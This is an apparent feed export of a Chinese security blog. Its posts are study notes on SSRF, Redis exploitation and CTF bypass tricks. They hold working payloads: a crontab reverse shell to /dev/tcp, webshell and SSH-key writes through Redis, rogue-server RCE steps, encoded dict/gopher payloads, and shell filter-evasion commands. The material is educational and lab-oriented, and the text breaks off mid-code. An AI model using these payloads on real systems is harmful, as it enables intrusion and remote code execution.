    <summary type="html">&lt;h2 id=&quot;CISCN2019-华北赛区-Day1-Web5-CyberPunk&quot;&gt;&lt;a href=&quot;#CISCN2019-华北赛区-Day1-Web5-CyberPunk&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 华北赛区 Day1 Web</summary>
      
    
    
    
    <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>SSRF</title>
    <link href="http://yoursite.com/2019/09/28/SSRF%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2019/09/28/SSRF%E5%AD%A6%E4%B9%A0/</id>
    <published>2019-09-27T16:00:00.000Z</published>
    <updated>2020-10-10T07:19:22.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSRF学习"><a href="#SSRF学习" class="headerlink" title="SSRF学习"></a>SSRF学习</h1><h2 id="URL结构"><a href="#URL结构" class="headerlink" title="URL结构"></a>URL结构</h2><p>url为统一资源定位符。</p><p>url标准格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[协议类型]://[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID</span><br></pre></td></tr></table></figure><p>url完整格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]</span><br></pre></td></tr></table></figure><ul><li>协议类型：一般含有http,https,file,ftp,gopher,wais,news,telent</li><li>凭证信息：username:password，以@结尾</li></ul><h2 id="Curl与ParseUrl解析url区别"><a href="#Curl与ParseUrl解析url区别" class="headerlink" title="Curl与ParseUrl解析url区别"></a>Curl与ParseUrl解析url区别</h2><p><a href="chrome-extension://cdonnmffkdaoajfknoeeecmchibpmkmg/assets/pdf/web/viewer.html?file=https%3A%2F%2Fwww.blackhat.com%2Fdocs%2Fus-17%2Fthursday%2Fus-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">blackhat2017</a>中提到了Curl与ParseUrl解析url的区别，要求Curl版本&lt;=7.54.0。</p><p>经过本地7.55.1测试，curl在port后不允许有空格出现<code>Port number ended with &#39; &#39;</code>，准确来说，port后只允许<code>/</code>。</p><p>本地复现一下，我在服务器中放置了1.txt，下面谈谈我的发现。</p><ul><li>curl会将空格后的内容看成一个目录比如下面代码中的URL就解析成<code>/ @www.baidu.com/../1.txt</code>经过apache解析成<code>/1.txt</code></li><li>经过抓包发现请求头中的Host为<code>ip:port @www.baidu.com</code>，应该是apache将host空格之后的内容截断了。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url=<span class="string">"http://u:p@ip:port @www.baidu.com/../1.txt"</span>;</span><br><span class="line"> var_dump(parse_url($url));</span><br><span class="line">  $ch = curl_init();</span><br><span class="line">  curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">  curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">  curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">//执行并获取HTML文档内容</span></span><br><span class="line">  $output = curl_exec($ch);</span><br><span class="line">  <span class="comment">//释放curl句柄</span></span><br><span class="line">var_dump( curl_error($ch) );</span><br><span class="line">var_dump($output);</span><br><span class="line">  curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>html成功返回1.txt的内容，而且parse_url解析的host为<code>www.baidu.com</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array (size=5)</span><br><span class="line">  'scheme' =&gt; string 'http' (length=4)</span><br><span class="line">  'host' =&gt; string 'www.baidu.com' (length=13)</span><br><span class="line">  'user' =&gt; string 'u' (length=1)</span><br><span class="line">  'pass' =&gt; string 'p@ip:port ' (length=17)</span><br><span class="line">  'path' =&gt; string '/../1.txt' (length=9)</span><br><span class="line">D:\phpstudy_pro\WWW\test\1.php:12:string '' (length=0)</span><br><span class="line">D:\phpstudy_pro\WWW\test\1.php:13:string 'ssrf success!</span><br></pre></td></tr></table></figure><h3 id="DNSRebinding"><a href="#DNSRebinding" class="headerlink" title="DNSRebinding"></a>DNSRebinding</h3><p>DNS服务器用来将域名解析到正确的IP地址，DNS TTL(Time To Live)为IP地址在DNS服务器上的缓存时间。</p><p>通常，为了加快解析时间，当DNS服务器接收到解析请求时，会将解析结果存在缓存中，如果在TTL时间内在此接收到此域名的解析请求，直接在缓存中返回结果。</p><p>我们可以通过控制恶意DNS服务器，设置一个相当低的TTL时间，不断变换IP地址以造成DNSRebinding攻击，可以利用它来访问内网IP地址。</p><p>这是一个<a href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">工具</a>,该工具能够生成一个域名，能够指定两个IP地址，该工具会将该域名在这两个地址间随机切换。</p><h2 id="Redis漏洞利用"><a href="#Redis漏洞利用" class="headerlink" title="Redis漏洞利用"></a>Redis漏洞利用</h2><p>在介绍漏洞利用之前，首先了解一下Redis的数据传输协议。</p><h3 id="Redis数据传输协议"><a href="#Redis数据传输协议" class="headerlink" title="Redis数据传输协议"></a>Redis数据传输协议</h3><p>Redis使用RESP序列化协议将传输的数据分为以下五种最小单元类型，单元结束时加上\r\n换行符：</p><ul><li>单行回复：回复的第一个字节是 “+”</li><li>错误信息：回复的第一个字节是 “-“</li><li>整形数字：回复的第一个字节是 “:”</li><li>多行字符串：回复的第一个字节是 “$”</li><li>数组：回复的第一个字节是 “*”</li></ul><h3 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h3><p>由于Redis的备份功能可以任意指定目录，这就造成了任意文件写入漏洞，主要有反弹shell、写WebShell、写ssh公钥这几种攻击方式。</p><h3 id="弹shell"><a href="#弹shell" class="headerlink" title="弹shell"></a>弹shell</h3><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>首先讲一下Linux的定时任务，在Linux中corntab命令用于设置周期性被执行的任务，crontab命令从标准输入设备读取指令，并存放于crontab文件中，以供之后的读取和执行。</p><p>crontab命令读取目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/</span><br><span class="line">/etc/crontab</span><br></pre></td></tr></table></figure><p>crontab文件格式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">minute hour day month week command</span><br><span class="line">操作符有</span><br><span class="line">* 取值范围内所有数字</span><br><span class="line">/ 每隔多久执行一次</span><br><span class="line">x-z 从x-z</span><br><span class="line">x，z 每x和z执行一次</span><br><span class="line">* * * * * 代表每分钟执行一次</span><br></pre></td></tr></table></figure><p>我们利用Redis的备份功能，在crontab读取命令的目录中，写入shell，即可执行shell命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set x "* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>弹shell要求Redis在root用户下运行</li><li>由于Redis备份的是Redis格式的数据，所以会包含许多乱码，在Ubuntu下不能执行（Centos会自动忽略错误信息）。</li></ul><h3 id="写入WebShell"><a href="#写入WebShell" class="headerlink" title="写入WebShell"></a>写入WebShell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;&lt;?php eval($_POST[&apos;aa&apos;]);?&gt;&quot;</span><br><span class="line">config set dir /Web目录</span><br><span class="line">config set dbfilename &quot;shell.php&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>Web目录写入权限</li></ul><h3 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">本地生成密钥对</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">##</span><br><span class="line">将公钥写入服务器/root/.ssh文件夹中</span><br><span class="line">set x &quot;公钥&quot;</span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>攻击者执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i 私钥 root@ip</span><br></pre></td></tr></table></figure><h4 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>root权限</li></ul><h2 id="主从复制RCE"><a href="#主从复制RCE" class="headerlink" title="主从复制RCE"></a>主从复制RCE</h2><p>虽然redis读取写入的速度很快，当大量的访问数据库的时候，为了分担压力，Redi支持主从复制功能，也就是读写分离，节点复制主节点全部数据(数据复制只能由主节点复制到从节点)，由主节点提供写服务，从节点提供读服务，可大大提高Redis服务器的并发量。</p><h3 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h3><h4 id="可扩展module"><a href="#可扩展module" class="headerlink" title="可扩展module"></a>可扩展module</h4><p>为了使Redis的使用更加的灵活，Redus4.0以上版本支持了可扩展的module，并给出了API文件和<a href="http://www.redis.cn/topics/modules-intro.html" target="_blank" rel="noopener">官方示例</a>。</p><p>用户只需按照API编写自己的module，并使用<code>module load module.so</code>命令加载模组，即可往Redis服务器中添加自己的命令，非常的方便，但是也能自定义函数完成RCE。</p><p>这里使用github上大佬的EXP<a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener">Redis-rouge-server</a>，该EXP编写了一个system.exec命令，加载module后能直接进行RCE。</p><p>但是这只是在自己的Redis服务器上实现了RCE，如何将他传入其他的Redis服务器呢？主从复制是不会将module也复制给从节点的，这就需要用到下面的主从复制全量同步。</p><h4 id="主从复制的全量同步"><a href="#主从复制的全量同步" class="headerlink" title="主从复制的全量同步"></a>主从复制的全量同步</h4><p>master服务器会开启一个后台进程用于将redis中的数据生成一个rdb文件，与此同时，服务器会缓存所有接收到的来自客户端的写命令（包含增、删、改），当后台保存进程处理完毕后，会将该rdb文件传递给slave服务器，而slave服务器会将rdb文件保存在磁盘并通过读取该文件将数据加载到内存，在此之后master服务器会将在此期间缓存的命令通过redis传输协议发送给slave服务器，然后slave服务器将这些命令依次作用于自己本地的数据集上最终达到数据的一致性。 </p><p>这里有一篇博文，想深入了解主从复制可以看看<a href="https://www.cnblogs.com/kismetv/p/9236731.html&gt;" target="_blank" rel="noopener">https://www.cnblogs.com/kismetv/p/9236731.html&gt;</a> </p><p>通过上面的两点可以知道当进行主从复制的全量同步时，会传输一个文件给slave服务器，所以我们可以利用这点，通过Python伪造一个恶意Redis服务器<a href="https://github.com/LoRexxar/redis-rogue-server" target="_blank" rel="noopener">恶意Redis服务器伪造</a>，当收到服务器的slave请求时，模拟全量同步的过程，将我们的exp.so发送到slave服务器中，在slave服务器执行<code>module load exp.so</code>即可实现RCE。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>一台Redis服务器</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull shuogesha/redis5.<span class="number">0.5</span></span><br></pre></td></tr></table></figure><p>伪造恶意Redis服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/LoRexxar/redis-rogue-server</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br></pre></td></tr></table></figure><p>启动靶机Reids的docker，将exp.so与伪造的Redis服务器放入同一文件夹</p><p><img src="https://i.loli.net/2020/10/02/fBM5grhtOyz8PjI.png" alt></p><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 目标IP --rport 目标端口 --lhost 攻击机IP</span><br></pre></td></tr></table></figure><p>注意：攻击机与目标机必须能够互相访问。<img src="C:%5CUsers%5CYCJ%5CAppData%5CLocal%5CTemp%5C1601623831202.png" alt="1601623831202"></p><p>现在恶意module已经被目标及加载，连接上即可执行命令。</p><p><img src="C:%5CUsers%5CYCJ%5CAppData%5CLocal%5CTemp%5C1601624030213.png" alt="1601624030213"></p><h2 id="恶意module加载RCE"><a href="#恶意module加载RCE" class="headerlink" title="恶意module加载RCE"></a>恶意module加载RCE</h2><p>主从复制RCE要求攻击机与目标机必须能够互相访问，但如果靶机不能访问外网主从复制就打不通，那能不能利用备份功能写入恶意module呢，答案是不能，之前说过，备份存入的文件是以Redis的特殊结构保存，在ELF文件看来就是乱码，因为ELF文件对格式要求严格，所以不能执行。</p><p>所以只能配合Web页面的文件上传，上传恶意module，然后再加载module实现RCE。</p><h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><p>gopher协议格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://ip:port/连接符+TCP/IP数据</span><br></pre></td></tr></table></figure><p>gopher会将连接符后面的数据发送给相应的端口，可以是字符串也可以是其他格式的请求包，比如GET,POST,redis,mysql未授权访问，将数据使用url编码，gopher才能正常解析。</p><h2 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h2><p>dict协议格式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dict://ip:port/命令:参数:参数</span><br><span class="line">dict://ip:port/命令 参数 参数</span><br></pre></td></tr></table></figure><p>dict协议是词典网络协议，可以连接字典服务器（比如Redis），不过只支持没有密码的Redis，因为dict只能逐行命令执行，每执行一行后，都会QUIT断开连接，所以无法保存身份认证信息。</p><h2 id="SSRF-Redis"><a href="#SSRF-Redis" class="headerlink" title="SSRF+Redis"></a>SSRF+Redis</h2><h3 id="利用途径"><a href="#利用途径" class="headerlink" title="利用途径"></a>利用途径</h3><h4 id="gopher发送Redis数据包"><a href="#gopher发送Redis数据包" class="headerlink" title="gopher发送Redis数据包"></a>gopher发送Redis数据包</h4><p>首先需要知道Redis数据包的格式，gopher才能正确解析。</p><p>使用socat端口转发获取Redis流量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:2333,fork tcp-connect:127.0.0.1:6379</span><br></pre></td></tr></table></figure><p>将来自2333端口的流量转发至6379端口(也就是Redis服务器端口)，-v参数能够显示转发的流量。</p><p>使用redis-cli连接2333端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 127.0.0.1 -p 2333</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/30/hIwJ29K5qf7TrMV.png" alt></p><p>执行<code>set x 1</code>命令可以看到转发的流量为，这是经过RESP协议序列化后的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$1\r</span><br><span class="line">x\r</span><br><span class="line">$1\r</span><br><span class="line">1\r</span><br></pre></td></tr></table></figure><p>所以我们只需要将payload转换成如上形式，然后url编码，使用gopher发送即可，前人栽树，后人乘凉，github上有许多生成payload脚本<a href="https://github.com/xmsec/redis-ssrf" target="_blank" rel="noopener">https://github.com/xmsec/redis-ssrf</a> (如果是get方式传参，需要进行二次编码)</p><h4 id="dict逐行执行命令"><a href="#dict逐行执行命令" class="headerlink" title="dict逐行执行命令"></a>dict逐行执行命令</h4><p>首先尝试直接发送payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://ip:port/set:x:&quot;&lt;?php eval($_POST[&apos;aa&apos;]);?&gt;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/iFK6TaIDBmbh1sL.png" alt></p><p>报错，抓取一下流量发现在?处被截断。</p><p><img src="https://i.loli.net/2020/10/02/ieoZNYUIWtafdJm.png" alt></p><h5 id="16进制编码绕过截断"><a href="#16进制编码绕过截断" class="headerlink" title="16进制编码绕过截断"></a>16进制编码绕过截断</h5><p>对于&lt;?这样的非法字符，需要用16进制编码，正常发送。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\x3C\x3Fphp\x20eval($_POST[&apos;aa&apos;])\x3B\x3F\x3E&quot;</span><br></pre></td></tr></table></figure><p>成功写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\x3C\x3Fphp\x20eval($_POST[&apos;aa&apos;])\x3B\x3F\x3E&quot;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename &quot;shell.php&quot;</span><br></pre></td></tr></table></figure><h5 id="bitop命令绕过截断"><a href="#bitop命令绕过截断" class="headerlink" title="bitop命令绕过截断"></a>bitop命令绕过截断</h5><p>Bitop命令为Redis位操作，BITOP命令支持四个位运算：AND，OR，XOR 和NOT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BITOP AND destkey key [key ...]  ，对一个或多个key求逻辑并，并将结果保存到destkey</span><br><span class="line">BITOP OR destkey key [key ...] ，对一个或多个key求逻辑或，并将结果保存到destkey</span><br><span class="line">BITOP XOR destkey key [key ...] ，对一个或多个key求逻辑异或，并将结果保存到destkey</span><br><span class="line">BITOP NOT destkey key ，对给定key求逻辑非，并将结果保存到destkey</span><br></pre></td></tr></table></figure><p>所以可以将payload取反，然后用bitop not还原数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\xc3\xc0\x8f\x97\x8f\xdf\x9a\x89\x9e\x93\xd7\xdb\xa0\xaf\xb0\xac\xab\xa4\xdd\x9e\x9e\xdd\xa2\xd6\xc4\xdf\xc0\xc1&quot;  //x=&lt;?php eval($_POST[&quot;aa&quot;]); ?&gt;</span><br><span class="line">bitop not x x</span><br><span class="line">get x</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SSRF学习&quot;&gt;&lt;a href=&quot;#SSRF学习&quot; class=&quot;headerlink&quot; title=&quot;SSRF学习&quot;&gt;&lt;/a&gt;SSRF学习&lt;/h1&gt;&lt;h2 id=&quot;URL结构&quot;&gt;&lt;a href=&quot;#URL结构&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="协议学习" scheme="http://yoursite.com/categories/协议学习/"/>
    
    
  </entry>
  
  <entry>
    <title>ctf</title>
    <link href="http://yoursite.com/2019/09/10/ctf%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/09/10/ctf%E6%80%BB%E7%BB%93/</id>
    <published>2019-09-09T16:00:00.000Z</published>
    <updated>2020-10-10T07:55:08.717Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="md5常见绕过"><a href="#md5常见绕过" class="headerlink" title="md5常见绕过"></a>md5常见绕过</h2><h3 id="强比较绕过"><a href="#强比较绕过" class="headerlink" title="强比较绕过"></a>强比较绕过</h3><p>数组绕过</p><p>​    md5碰到数组数据时返回null，null===nulll绕过。</p><p>md5碰撞</p><p>​    fastcoll</p><h3 id="弱比较绕过"><a href="#弱比较绕过" class="headerlink" title="弱比较绕过"></a>弱比较绕过</h3><p>利用科学计数法0e+任何数字都为0。</p><p>以下值在md5加密后以0E开头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure><p>以下值在sha1加密后以0E开头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sha1(‘aaroZmOk’)</span><br><span class="line">sha1(‘aaK1STfY’)</span><br><span class="line">sha1(‘aaO8zKZF’)</span><br><span class="line">sha1(‘aa3OFF9m’)</span><br></pre></td></tr></table></figure><p>以下值加密前后弱比较相等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure><h2 id="eval命令执行"><a href="#eval命令执行" class="headerlink" title="eval命令执行"></a>eval命令执行</h2><h3 id="无数字字母"><a href="#无数字字母" class="headerlink" title="无数字字母"></a>无数字字母</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload php5-php7.0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=$_=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=phpinfo()<span class="comment">//$_=_GET</span></span><br></pre></td></tr></table></figure><p>如果把下划线也ban了，还能使用不可见字符或者+或者中文来做变量名。</p><p>php7.0之后BAN了assert，不过可以用取反来调用函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();<span class="comment">//phpinfo();</span></span><br></pre></td></tr></table></figure><p>值得一提的是eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过变量函数的形式来调用（虽然它确实像极了函数原型）。这样的语法构造还包括：echo，print，unset()，isset()，empty()，include，require。</p><h2 id="preg-match绕过"><a href="#preg-match绕过" class="headerlink" title="preg_match绕过"></a>preg_match绕过</h2><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>当preg_match处理数组时会返回flase。</p><h3 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a>换行符</h3><p>正则<code>.</code>不会匹配换行符</p><p>在单行匹配下，<code>$</code>不会匹配\n或者\r。</p><h3 id="PCRE回溯次数限制"><a href="#PCRE回溯次数限制" class="headerlink" title="PCRE回溯次数限制"></a>PCRE回溯次数限制</h3><p><a href="https://security.bytedance.com/index/" target="_blank" rel="noopener">https://security.bytedance.com/index/</a> </p><p>PHP的PCRE采用NFA正则引擎</p><p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态 </p><p>NFA引擎会设置一个最大回溯次数，如果超过这个次数就返回FLASE,所以我们可发送超长字符串，使正则返回失败。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BytesIO(b&apos;aaa&lt;?php eval($_POST[txt]);//&apos; + b&apos;a&apos; * 1000000)</span><br></pre></td></tr></table></figure><h2 id="Linux命令执行"><a href="#Linux命令执行" class="headerlink" title="Linux命令执行"></a>Linux命令执行</h2><p>参考文章<a href="https://blog.zeddyu.info/2019/01/17/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/01/17/</a> </p><h3 id="常用通配符"><a href="#常用通配符" class="headerlink" title="常用通配符"></a>常用通配符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?匹配一个任意字符</span><br><span class="line">*匹配任意字符</span><br></pre></td></tr></table></figure><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>$IFS分隔符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;IFS&#125;</span>,<span class="variable">$IFS</span><span class="variable">$9</span></span><br></pre></td></tr></table></figure><p>IFS表示linux下的分隔符，但是直接使用$IFS会导致歧义，比如cat$IFSfile，这样bash会将整个IFSfile当成变量名，导致无法读取到file文件，通常我们用${IFS}来确定变量名，或者使用$IFS$9,$9为当前系统shell进程的第九个参数，默认为空，在这里起到一个隔断作用。</p><p>花括号扩展<code>{OS_COMMAND,ARGUMENT}</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,file&#125;</span><br></pre></td></tr></table></figure><p>变量绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="string">'cat\x20flag'</span>&amp;&amp;<span class="variable">$x</span></span><br><span class="line">x=<span class="string">'cat\x09flag'</span>&amp;&amp;<span class="variable">$x</span></span><br></pre></td></tr></table></figure><p>\x20和\x09分别表示空格与tab。</p><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">变量拼接</span><br><span class="line">a=l;b=s;<span class="variable">$a</span><span class="variable">$b</span></span><br><span class="line"><span class="variable">$@</span>绕过</span><br><span class="line">l<span class="variable">$@s</span></span><br><span class="line">单双引号绕过</span><br><span class="line"><span class="string">"l"</span>s</span><br><span class="line">反斜杠绕过</span><br><span class="line">l\s</span><br><span class="line">已有资源截取</span><br><span class="line">ls <span class="variable">$&#123;PATH:9:1&#125;</span><span class="variable">$&#123;PATH:11:1&#125;</span></span><br><span class="line">nl <span class="variable">$&#123;PATH:14:1&#125;</span><span class="variable">$&#123;PATH:21:1&#125;</span></span><br><span class="line"><span class="variable">$PS2</span>= &gt;</span><br><span class="line"><span class="variable">$ps4</span>= +</span><br><span class="line">编码绕过</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"命令base64编码"</span>|base64 -d|bash</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"hex编码"</span> | xxd -r -p|bash</span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">"\154\163"</span>)八进制编码</span><br><span class="line">&#123;<span class="built_in">printf</span>,<span 